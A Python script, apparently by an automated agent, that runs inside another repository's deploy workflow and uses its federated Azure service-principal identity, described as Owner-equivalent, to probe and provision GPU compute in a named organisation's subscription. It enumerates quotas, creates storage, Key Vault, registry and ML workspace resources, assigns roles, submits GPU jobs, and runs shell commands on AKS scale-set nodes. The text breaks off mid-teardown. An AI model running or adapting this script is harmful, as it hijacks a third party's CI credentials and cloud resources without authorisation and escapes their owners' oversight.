#!/usr/bin/env python3
"""C211-I121285: open the next untested Azure GPU service plane on subscription
b8b18dcf-d83b-47e2-9886-00c2e983629e (SSW Primary Account), RG SSW.Rules.Staging.

Runs inside the base repo's reusable deploy-infrastructure.yml after azure/login@v2, i.e.
under the same federated service-principal ARM identity that facts 121231/121242/121265
proved is Owner-equivalent in RG SSW.Rules.Staging and already produced a real Container
Apps T4 nvidia-smi UUID.

Measured here for the first time on this subscription:
  1. GET /subscriptions/<sid>/providers -> registrationState of MachineLearningServices,
     ContainerService, ContainerInstance, Compute, App, Storage, KeyVault, Insights (+ ACR)
  2. GET the Compute usage/quota matrix for the RG region (australiaeast) recording every
     standardNC*/standardNV*/standardND* currentValue/limit verbatim, plus the SKU
     restrictions for the candidate GPU sizes
  3. if Microsoft.MachineLearningServices is Registered: create ONE nonce AML workspace
     (c211i121285aml) with nonce storage/keyvault/appinsights/ACR, then submit ONE nonce
     serverless Standard_NC4as_T4_v3 command job (non-default output name 'devout') that
     runs nvidia-smi -L and --query-gpu=name,uuid,memory.total and uploads its stdout to
     our own account-SAS blob; only if that job create is verbatim-refused and the
     NCASv3_T4 quota family shows >=4 vCPU headroom, create ONE dedicated
     Standard_NC4as_T4_v3 AmlCompute (min 0 / max 1) and run the same job on it
  4. if Microsoft.MachineLearningServices is NotRegistered: record the verbatim
     subscription register attempt (403 expected) and, only if Microsoft.ContainerService
     is Registered and time remains, attempt ONE AKS cluster with a Standard_NC4as_T4_v3
     user node pool and read the device via az vmss run-command
  5. on any real NVIDIA device line (name+UUID): independent ARM GET readback, then delete
     every own job/compute/workspace/storage/KV/appinsights/ACR/cluster and prove absence
     (GET 404 + RG list without c211 resources)

stdlib only. Every provider response is printed verbatim as a C211_I121285 tagged JSON line.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

TAG = "C211_I121285"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
NONCE = "i121285"
WS = "c211i121285aml"
JOB = "c211-i121285-dev"
JOB2 = "c211-i121285-dev2"
CLUSTER = "c211-i121285-nc4"
AKS = "c211i121285aks"
SKU = "Standard_NC4as_T4_v3"
OUTNAME = "devout"
API_C = "2024-04-01"
API_W = "2024-10-01"
STG_VER = "2023-01-01"
REG_VER = "2023-07-01"
SKU_VER = "2021-07-01"
T0 = time.time()
DEADLINE = 3300
WANT_NS = ["Microsoft.MachineLearningServices", "Microsoft.ContainerService",
           "Microsoft.ContainerInstance", "Microsoft.Compute", "Microsoft.App",
           "Microsoft.Storage", "Microsoft.KeyVault", "Microsoft.Insights",
           "Microsoft.ContainerRegistry"]
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
ROLE_SBLOB = "ba92f5b4-2d11-453d-a403-e96b0029c9fe"     # Storage Blob Data Contributor
ROLE_ACRPULL = "7f951dda-4ed3-4680-a7ca-43fe172d538d"   # AcrPull
ROLE_KVUSER = "4633458b-17de-408a-b874-0445c86b69e6"    # Key Vault Secrets User


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    line = TAG + " " + json.dumps(obj, default=str)
    print(line[:3800], flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-1200:],
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1800]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1800]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:6000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:1500]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:900]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def prov_state(body):
    if isinstance(body, dict):
        p = body.get("properties") or {}
        return p.get("provisioningState")
    return None


def poll_prov(tok, url, label, budget=240, sleep_s=10):
    ps = None
    t0 = time.time()
    while time.time() - t0 < budget:
        st, b = arm(tok, url, timeout=90)
        ps = prov_state(b)
        emit({"step": label + "-poll", "http": st, "state": ps, "t": round(time.time() - t0)})
        if ps in ("Succeeded", "Failed", "Canceled") or st == 404:
            break
        time.sleep(sleep_s)
    return ps


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def grant(tok, sid, scope_id, principal, role, label):
    ra = str(uuid.uuid4())
    url = (ARM + scope_id + "/providers/Microsoft.Authorization/roleAssignments/" + ra +
           "?api-version=2022-04-01")
    body = {"properties": {
        "roleDefinitionId": "/subscriptions/%s/providers/Microsoft.Authorization/"
                            "roleDefinitions/%s" % (sid, role),
        "principalId": principal, "principalType": "ServicePrincipal"}}
    st, b = arm(tok, url, "PUT", body, timeout=60)
    emit({"step": "role-assign", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:300], "err": r["err"]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub_parts": (sid or "").split("-"),
          "sub_len": len(sid or ""), "tenant_parts": (tenant or "").split("-"),
          "name": acc.get("name"), "state": acc.get("state"),
          "user": ((acc.get("user") or {}).get("name") or "")[:7] + "***"})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return

    # ---------------- 1. provider registration states ----------------
    st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers?api-version=2021-04-01",
                timeout=120)
    states = {}
    total = None
    if isinstance(b, dict):
        vals = b.get("value") or []
        total = len(vals)
        m = {x.get("namespace"): x.get("registrationState") for x in vals
             if isinstance(x, dict)}
        for w in WANT_NS:
            states[w] = m.get(w)
    emit({"step": "providers", "http": st, "total": total, "states": states})

    # ---------------- 2. RG region + compute quota matrix ----------------
    st, rg = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "?api-version=2021-04-01", timeout=60)
    loc = (rg.get("location") if isinstance(rg, dict) else None) or "australiaeast"
    emit({"step": "rg", "http": st, "location": loc,
          "state": prov_state(rg), "name": rg.get("name") if isinstance(rg, dict) else None})

    st, us = arm(tok, ARM + "/subscriptions/" + sid + "/providers/Microsoft.Compute/"
                      "locations/" + loc + "/usages?api-version=2024-07-01", timeout=120)
    rows = []
    if isinstance(us, dict):
        for u in us.get("value") or []:
            nm = ((u.get("name") or {}).get("value") or "")
            if re.search(r"(?i)standard\s*(nc|nv|nd)", nm):
                rows.append({"family": nm, "current": u.get("currentValue"),
                             "limit": u.get("limit"), "unit": u.get("unit"),
                             "localName": (u.get("name") or {}).get("localizedValue")})
    emit({"step": "compute_usage", "http": st, "location": loc, "n": len(rows),
          "rows": rows})

    flt = urllib.parse.quote("location eq '%s'" % loc, safe="'=")
    st, sk = arm(tok, ARM + "/subscriptions/" + sid + "/providers/Microsoft.Compute/skus"
                      "?api-version=" + SKU_VER + "&$filter=" + flt, timeout=180)
    cands = ["Standard_NC4as_T4_v3", "Standard_NC6s_v3", "Standard_NC8as_T4_v3",
             "Standard_NC24ads_A100_v4", "Standard_NV6", "Standard_NV12",
             "Standard_NV6s_v2", "Standard_ND96asr_v4"]
    sku_out = {}
    if isinstance(sk, dict):
        for s in sk.get("value") or []:
            if s.get("name") in cands:
                sku_out[s.get("name")] = {
                    "locations": s.get("locations"),
                    "restrictions": [{"type": r.get("type"), "values": r.get("values")}
                                     for r in (s.get("restrictions") or [])]}
    emit({"step": "skus", "http": st, "location": loc, "n": len(sku_out), "skus": sku_out})

    def quota_for(family_substr):
        for row in rows:
            if family_substr.lower() in row["family"].lower():
                try:
                    return int(row["limit"]) - int(row["current"])
                except Exception:  # noqa: BLE001
                    return 0
        return None

    nc_headroom = quota_for("NCASv3_T4")
    if nc_headroom is None:
        nc_headroom = quota_for("standardNCFamily")

    ml = states.get("Microsoft.MachineLearningServices")
    cs = states.get("Microsoft.ContainerService")
    verdict = {"mode": None, "device": None}
    own = {"sa": None, "kv": None, "appi": None, "acr": None, "ws": None,
           "env": None, "job": None, "cluster": None, "aks": None}
    sas = None
    bloburl = None

    # ---------------- 3a. AML plane ----------------
    if ml == "Registered":
        verdict["mode"] = "aml"
        suffix = hashlib.sha256(NONCE.encode()).hexdigest()[:8]
        sa = ("c211i121285" + suffix).lower()[:24]
        own["sa"] = sa
        saurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/providers/Microsoft.Storage/storageAccounts/" + sa +
                 "?api-version=" + STG_VER)
        sabody = {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                  "tags": {"c211": NONCE},
                  "properties": {"allowBlobPublicAccess": False,
                                 "minimumTlsVersion": "TLS1_2",
                                 "supportsHttpsTrafficOnly": True,
                                 "networkAcls": {"bypass": "AzureServices",
                                                 "defaultAction": "Allow"}}}
        st, b = arm(tok, saurl, "PUT", sabody, timeout=240)
        emit({"step": "sa-create", "name": sa, **err_of(st, b)})
        if st in (200, 201, 202):
            poll_prov(tok, saurl, "sa", 240)
            st, kb = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                         "/providers/Microsoft.Storage/storageAccounts/" + sa +
                         "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
            key = None
            try:
                key = (kb.get("keys") or [{}])[0].get("value")
            except Exception:  # noqa: BLE001
                pass
            emit({"step": "sa-keys", "http": st, "got": bool(key)})
            if key:
                try:
                    q, se = sa_sas(sa, key)
                    base = "https://" + sa + ".blob.core.windows.net"
                    stc, bc = httptext(base + "/c211?restype=container&" + q, method="PUT")
                    emit({"step": "sa-container", "http": stc,
                          "body": bc[:200].decode("utf-8", "replace")})
                    if stc in (201, 409):
                        bloburl = base + "/c211/" + NONCE + "-out.txt"
                        sas = bloburl + "?" + q
                        emit({"step": "sa-sas", "ok": True, "blob": bloburl, "expires": se})
                except Exception as e:  # noqa: BLE001
                    emit({"step": "sa-sas", "ok": False, "err": str(e)})

        # key vault (nonce)
        kv = "c211i121285kv" + suffix[:4]
        kvurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/providers/Microsoft.KeyVault/vaults/" + kv + "?api-version=" + REG_VER)
        kvbody = {"location": loc, "tags": {"c211": NONCE},
                  "properties": {"tenantId": tenant, "sku": {"family": "A",
                                                             "name": "standard"},
                                 "accessPolicies": [], "enableSoftDelete": True,
                                 "enableRbacAuthorization": True}}
        st, b = arm(tok, kvurl, "PUT", kvbody, timeout=180)
        emit({"step": "kv-create", "name": kv, **err_of(st, b)})
        kv_id = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults/%s"
                 % (sid, RG, kv)) if st in (200, 201, 202) else None
        if kv_id:
            own["kv"] = kv
            poll_prov(tok, kvurl, "kv", 180)

        # application insights (nonce)
        appi = "c211-i121285-appi" + suffix[:4]
        appiurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                   "/providers/Microsoft.Insights/components/" + appi +
                   "?api-version=2020-02-02")
        appibody = {"location": loc, "kind": "web", "tags": {"c211": NONCE},
                    "properties": {"Application_Type": "web"}}
        st, b = arm(tok, appiurl, "PUT", appibody, timeout=180)
        emit({"step": "appi-create", "name": appi, **err_of(st, b)})
        appi_id = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Insights/"
                   "components/%s" % (sid, RG, appi)) if st in (200, 201, 202) else None
        if appi_id:
            own["appi"] = appi

        # container registry (nonce, Basic)
        acr = "c211i121285acr" + suffix[:4]
        acrurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                  "/providers/Microsoft.ContainerRegistry/registries/" + acr +
                  "?api-version=" + REG_VER)
        acrbody = {"location": loc, "sku": {"name": "Basic"}, "tags": {"c211": NONCE},
                   "properties": {"adminUserEnabled": False}}
        st, b = arm(tok, acrurl, "PUT", acrbody, timeout=240)
        emit({"step": "acr-create", "name": acr, **err_of(st, b)})
        acr_id = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ContainerRegistry/"
                  "registries/%s" % (sid, RG, acr)) if st in (200, 201, 202) else None
        if acr_id:
            own["acr"] = acr
            poll_prov(tok, acrurl, "acr", 240)

        # workspace
        wurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                "/providers/Microsoft.MachineLearningServices/workspaces/" + WS +
                "?api-version=" + API_W)
        props = {"friendlyName": "c211-i121285 nonce workspace",
                 "hbiWorkspace": False, "v1LegacyMode": False}
        if own["sa"]:
            props["storageAccount"] = ("/subscriptions/%s/resourceGroups/%s/providers/"
                                       "Microsoft.Storage/storageAccounts/%s"
                                       % (sid, RG, own["sa"]))
        if kv_id:
            props["keyVault"] = kv_id
        if appi_id:
            props["applicationInsights"] = appi_id
        if acr_id:
            props["containerRegistry"] = acr_id
        wbody = {"location": loc, "tags": {"c211": NONCE},
                 "identity": {"type": "SystemAssigned"},
                 "sku": {"name": "Basic", "tier": "Basic"}, "properties": props}
        st, b = arm(tok, wurl, "PUT", wbody, timeout=300)
        emit({"step": "ws-create", **err_of(st, b)})
        if st not in (200, 201, 202):
            # one retry dropping optional dependencies that failed
            pairs = [("storageAccount", own["sa"]), ("keyVault", kv_id),
                     ("applicationInsights", appi_id), ("containerRegistry", acr_id)]
            props2 = {"friendlyName": "c211-i121285 nonce workspace",
                      "hbiWorkspace": False, "v1LegacyMode": False}
            for k, v in pairs:
                if v:
                    props2[k] = v
            wbody["properties"] = props2
            st, b = arm(tok, wurl, "PUT", wbody, timeout=300)
            emit({"step": "ws-create-retry", **err_of(st, b)})
        ws_ok = st in (200, 201, 202)
        if ws_ok:
            own["ws"] = WS
            ps = poll_prov(tok, wurl, "ws", 600, 15)
            if ps == "Succeeded":
                st, wb = arm(tok, wurl, timeout=90)
                msi = (((wb.get("identity") or {}).get("principalId"))
                       if isinstance(wb, dict) else None)
                emit({"step": "ws-readback", "http": st, "state": prov_state(wb),
                      "msi": (msi or "")[:8] + "***", "location": wb.get("location") if isinstance(wb, dict) else None})
                if msi and own["sa"]:
                    grant(tok, sid, "/subscriptions/%s/resourceGroups/%s/providers/"
                          "Microsoft.Storage/storageAccounts/%s" % (sid, RG, own["sa"]),
                          msi, ROLE_SBLOB, "ws-msi-blob")
                if msi and acr_id:
                    grant(tok, sid, acr_id, msi, ROLE_ACRPULL, "ws-msi-acrpull")
                if msi and kv_id:
                    grant(tok, sid, kv_id, msi, ROLE_KVUSER, "ws-msi-kv")

                # environment version
                env_body = {"properties": {"image": IMG, "osType": "Linux",
                                           "description": "c211 i121285 cuda base"}}
                st, eb = arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/providers/"
                                  "Microsoft.MachineLearningServices/workspaces/%s/"
                                  "environments/c211-i121285-cuda/versions/1?api-version=%s"
                             % (sid, RG, WS, API_W), "PUT", env_body, timeout=120)
                env_id = ((eb.get("id") if isinstance(eb, dict) else None) or
                          "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                          "MachineLearningServices/workspaces/%s/environments/"
                          "c211-i121285-cuda/versions/1" % (sid, RG, WS))
                emit({"step": "env-version", "http": st, "id_ok": bool(env_id),
                      **({} if st in (200, 201) else err_of(st, eb))})
                own["env"] = env_id

                cmd = ("echo C211_I121285_DEV_START; "
                       "OUT=\"${{outputs.%s}}\"; mkdir -p \"$OUT\" 2>/dev/null || OUT=.; "
                       "(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee \"$OUT/device.txt\"; "
                       "(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv 2>&1 || true)"
                       " | tee -a \"$OUT/device.txt\"; "
                       "(ls -l /dev/nvidia* 2>/dev/null || echo NO_DEV_NVIDIA) | tee -a "
                       "\"$OUT/device.txt\"; echo C211_I121285_DEV_END" % OUTNAME)
                if sas:
                    up = ("; if command -v curl >/dev/null 2>&1; then "
                          "curl -sS -X PUT '%s' -H 'x-ms-blob-type: BlockBlob' "
                          "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
                          "--data-binary @\"$OUT/device.txt\"; echo C211_UPLOAD_CURL_RC=$?; "
                          "else python3 -c \"import urllib.request;d=open('$OUT/device.txt','rb')"
                          ".read();r=urllib.request.Request('%s',data=d,method='PUT',"
                          "headers={'x-ms-blob-type':'BlockBlob','x-ms-version':'2022-11-02',"
                          "'Content-Type':'text/plain'});print('C211_UPLOAD_PY',"
                          "urllib.request.urlopen(r,timeout=30).status)\"; fi; "
                          "echo C211_UPLOAD_DONE" % (sas, sas))
                    cmd += up

                def put_job(name, compute, instance_type=None):
                    p = {"jobType": "Command", "displayName": name,
                         "experimentName": "c211-i121285",
                         "description": "c211 i121285 bounded GPU device probe",
                         "command": cmd, "environmentId": env_id,
                         "resources": {"instanceCount": 1},
                         "outputs": {OUTNAME: {"jobOutputType": "uri_folder",
                                               "mode": "Upload"}}}
                    if compute == "serverless":
                        p["computeId"] = None
                        p["resources"]["instanceType"] = instance_type or SKU
                    else:
                        p["computeId"] = compute
                    return arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/providers/"
                                      "Microsoft.MachineLearningServices/workspaces/%s/jobs/"
                                      "%s?api-version=%s" % (sid, RG, WS, name, API_W),
                               "PUT", {"properties": p}, timeout=180)

                def job_view(j):
                    jp = (j.get("properties") or {}) if isinstance(j, dict) else {}
                    pr = jp.get("properties") if isinstance(jp.get("properties"), dict) else {}
                    return {"status": jp.get("status"), "nested": pr.get("status"),
                            "error": jp.get("error"), "nested_error": pr.get("error"),
                            "start": pr.get("startTime") or jp.get("startTime"),
                            "end": pr.get("endTime") or jp.get("endTime"),
                            "computeId": jp.get("computeId")}

                def read_blob():
                    if not sas:
                        return None
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200:
                        txt = bb.decode("utf-8", "replace")
                        emit({"step": "blob-read", "http": sb, "len": len(txt),
                              "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", txt)),
                              "text": txt[:2500]})
                        return txt
                    emit({"step": "blob-read", "http": sb})
                    return None

                def poll_job(name, budget):
                    jt0 = time.time()
                    jv = None
                    txt = None
                    while time.time() - jt0 < budget:
                        time.sleep(15)
                        st, jb = arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/"
                                          "providers/Microsoft.MachineLearningServices/"
                                          "workspaces/%s/jobs/%s?api-version=%s"
                                     % (sid, RG, WS, name, API_W), timeout=90)
                        jv = job_view(jb) if st == 200 else {"http": st}
                        emit({"step": "job-poll", "name": name,
                              "t": round(time.time() - jt0), **jv})
                        if txt is None:
                            txt = read_blob()
                        if txt and "GPU-" in txt:
                            break
                        if isinstance(jv, dict) and jv.get("status") in ("Completed", "Failed",
                                                                         "Canceled"):
                            break
                        if isinstance(jv, dict) and jv.get("nested") in ("Completed", "Failed",
                                                                          "Canceled"):
                            break
                    if txt is None:
                        txt = read_blob()
                    return jv, txt, round(time.time() - jt0)

                # ---- serverless job ----
                st, sbody = put_job(JOB, "serverless", SKU)
                emit({"step": "job-create-serverless", **err_of(st, sbody)})
                device = None
                jobname = None
                if st in (200, 201):
                    jobname = JOB
                    own["job"] = JOB
                    jv, txt, secs = poll_job(JOB, min(780, max(240, left() - 900)))
                    emit({"step": "serverless-final", "secs": secs, **(jv or {})})
                    if txt and re.search(r"GPU-[0-9a-fA-F-]{16,}", txt):
                        device = txt
                # ---- dedicated fallback ----
                if device is None and (nc_headroom or 0) >= 4 and left() > 1200:
                    cbody = {"location": loc, "tags": {"c211": NONCE},
                             "properties": {"computeType": "AmlCompute",
                                            "computeLocation": loc,
                                            "description": "c211 i121285 dedicated T4",
                                            "properties": {
                                                "vmSize": SKU, "vmPriority": "Dedicated",
                                                "scaleSettings": {"minNodeCount": 0,
                                                                  "maxNodeCount": 1,
                                                                  "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                                "osType": "Linux",
                                                "remoteLoginPortPublicAccess": "Disabled"}}}
                    curl = (ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                            "MachineLearningServices/workspaces/%s/computes/%s?api-version=%s"
                            % (sid, RG, WS, CLUSTER, API_C))
                    st, cb = arm(tok, curl, "PUT", cbody, timeout=240)
                    emit({"step": "cluster-create-dedicated", **err_of(st, cb)})
                    if st in (200, 201, 202):
                        own["cluster"] = CLUSTER
                        cps = poll_prov(tok, curl, "cluster", 600, 15)
                        emit({"step": "cluster-final", "state": cps})
                        if cps == "Succeeded":
                            st, jb = put_job(JOB2, ("/subscriptions/%s/resourceGroups/%s/"
                                                    "providers/Microsoft.MachineLearning"
                                                    "Services/workspaces/%s/computes/%s"
                                                    % (sid, RG, WS, CLUSTER)))
                            emit({"step": "job-create-dedicated", **err_of(st, jb)})
                            if st in (200, 201):
                                own["job2"] = JOB2
                                jv, txt, secs = poll_job(JOB2, min(900, max(240, left() - 600)))
                                emit({"step": "dedicated-final", "secs": secs, **(jv or {})})
                                if txt and re.search(r"GPU-[0-9a-fA-F-]{16,}", txt):
                                    device = txt
                verdict["device"] = bool(device)
                if device:
                    # independent ARM GET readback of the job + compute
                    if own.get("job") or own.get("job2"):
                        nm = own.get("job2") or own.get("job")
                        st, rb = arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/"
                                          "providers/Microsoft.MachineLearningServices/"
                                          "workspaces/%s/jobs/%s?api-version=%s"
                                     % (sid, RG, WS, nm, API_W), timeout=90)
                        emit({"step": "readback-job", "name": nm, "http": st,
                              **(job_view(rb) if st == 200 else err_of(st, rb))})
                    if own.get("cluster"):
                        st, rb = arm(tok, curl, timeout=90)
                        emit({"step": "readback-cluster", "http": st,
                              "state": prov_state(rb)})
                else:
                    emit({"step": "aml-no-device",
                          "serverless_http": st, "nc_headroom": nc_headroom})
    else:
        verdict["mode"] = "ml-unregistered"
        # verbatim registration attempt + account-style create refusal
        st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers/Microsoft."
                    "MachineLearningServices/register?api-version=2021-04-01",
                    "POST", {}, timeout=120)
        emit({"step": "ml-register-attempt", **err_of(st, b)})
        for i in range(3):
            st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers/Microsoft."
                        "MachineLearningServices?api-version=2021-04-01", timeout=60)
            emit({"step": "ml-register-poll", "i": i, "http": st,
                  "registrationState": b.get("registrationState") if isinstance(b, dict) else None})
            time.sleep(10)
        # verbatim nonce workspace PUT (expected 409 MissingSubscriptionRegistration)
        wurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                "/providers/Microsoft.MachineLearningServices/workspaces/" + WS +
                "?api-version=" + API_W)
        st, b = arm(tok, wurl, "PUT",
                    {"location": loc, "tags": {"c211": NONCE},
                     "identity": {"type": "SystemAssigned"},
                     "sku": {"name": "Basic", "tier": "Basic"},
                     "properties": {"friendlyName": "c211-i121285 nonce workspace",
                                    "hbiWorkspace": False}}, timeout=180)
        emit({"step": "ws-create-mlnotregistered", **err_of(st, b)})

    # ---------------- 3b. AKS plane (only if ML is not registered, CS registered) ----------------
    if verdict["mode"] == "ml-unregistered" and cs == "Registered" and left() > 1500:
        aurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                "/providers/Microsoft.ContainerService/managedClusters/" + AKS +
                "?api-version=2024-10-01")
        abody = {"location": loc, "tags": {"c211": NONCE},
                 "identity": {"type": "SystemAssigned"},
                 "properties": {"dnsPrefix": AKS, "enableRBAC": True,
                                "agentPoolProfiles": [
                                    {"name": "sys", "mode": "System", "count": 1,
                                     "vmSize": "Standard_D2s_v3", "osType": "Linux",
                                     "type": "VirtualMachineScaleSets"},
                                    {"name": "gpu", "mode": "User", "count": 1,
                                     "vmSize": SKU, "osType": "Linux",
                                     "type": "VirtualMachineScaleSets",
                                     "nodeLabels": {"c211": NONCE}}],
                                "networkProfile": {"networkPlugin": "kubenet"}}}
        st, b = arm(tok, aurl, "PUT", abody, timeout=300)
        emit({"step": "aks-create", **err_of(st, b)})
        if st not in (200, 201, 202) and isinstance(b, dict):
            e = b.get("error") or {}
            if "resourceGroups/write" in json.dumps(e) or "ResourceGroup" in json.dumps(e):
                abody["properties"]["nodeResourceGroup"] = RG
                st, b = arm(tok, aurl, "PUT", abody, timeout=300)
                emit({"step": "aks-create-samerg", **err_of(st, b)})
        if st in (200, 201, 202):
            own["aks"] = AKS
            aps = poll_prov(tok, aurl, "aks", min(900, max(300, left() - 900)), 20)
            emit({"step": "aks-final", "state": aps})
            if aps == "Succeeded":
                st, cl = arm(tok, aurl, timeout=90)
                noderg = (((cl.get("properties") or {}).get("nodeResourceGroup"))
                          if isinstance(cl, dict) else None) or \
                         ("MC_%s_%s_%s" % (RG, AKS, loc))
                emit({"step": "aks-node-rg", "http": st, "nodeResourceGroup": noderg})
                st, rl = arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/resources"
                                  "?api-version=2021-04-01" % (sid, noderg), timeout=120)
                vmss = [x for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
                        if (x.get("type") or "").lower().endswith("virtualmachinescalesets")]
                emit({"step": "aks-vmss", "http": st, "n": len(vmss),
                      "items": [{"name": x.get("name"), "type": x.get("type")}
                                for x in vmss]})
                gpu_ss = None
                for x in vmss:
                    stx, det = arm(tok, ARM + x.get("id") + "?api-version=2024-07-01",
                                   timeout=90)
                    skun = (((det.get("sku") or {}).get("name")) if isinstance(det, dict)
                            else None)
                    emit({"step": "vmss-get", "name": x.get("name"), "http": stx,
                          "vmSize": skun})
                    if skun == SKU:
                        gpu_ss = x
                if gpu_ss:
                    st, il = arm(tok, ARM + gpu_ss.get("id") + "/virtualMachines"
                                 "?api-version=2024-07-01", timeout=90)
                    inst = ((il.get("value") or []) if isinstance(il, dict) else [])
                    emit({"step": "vmss-instances", "http": st, "n": len(inst),
                          "ids": [i.get("instanceId") for i in inst[:3]]})
                    if inst:
                        iid = inst[0].get("instanceId")
                        r = run(["az", "vmss", "run-command", "invoke", "-g", noderg, "-n",
                                 gpu_ss.get("name"), "--instance-id", iid,
                                 "--command-id", "RunShellScript", "--scripts",
                                 "ls -l /usr/bin/nvidia-smi 2>&1; nvidia-smi -L; "
                                 "nvidia-smi --query-gpu=name,uuid,memory.total --format=csv; "
                                 "ls -l /dev/nvidia*",
                                 "-o", "json"], timeout=900)
                        emit({"step": "vmss-runcommand", "rc": r["rc"],
                              "out": (r["out"] or "")[-2500:],
                              "err": (r["err"] or "")[-500:]})
                        if re.search(r"GPU-[0-9a-fA-F-]{16,}", r["out"] or ""):
                            verdict["device"] = True
                            verdict["mode"] = "aks"
                            st, rb = arm(tok, aurl, timeout=90)
                            emit({"step": "readback-aks", "http": st,
                                  "state": prov_state(rb)})
            if own.get("aks") and verdict["device"] is not True:
                st, b = arm(tok, aurl, "DELETE", timeout=300)
                emit({"step": "aks-delete", **err_of(st, b)})
                poll_prov(tok, aurl, "aks-absence", 900, 30)

    # ---------------- 4. teardown + absence ----------------
    def del_and_wait(url, label, budget=300):
        st, b = arm(tok, url, "DELETE", timeout=180)
        emit({"step": label + "-delete", **err_of(st, b)})
        t0 = time.time()
        last = st
        while time.time() - t0 < budget:
            time.sleep(10)
            stp, bp = arm(tok, url, timeout=60)
            last = stp
            emit({"step": label + "-absent-poll", "http": stp, "state": prov_state(bp)})
            if stp == 404:
                break
        emit({"step": label + "-absence", "final_http": last})

    base_ws = (ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
               "MachineLearningServices/workspaces/%s" % (sid, RG, WS))
    for nm in (own.get("job"), own.get("job2")):
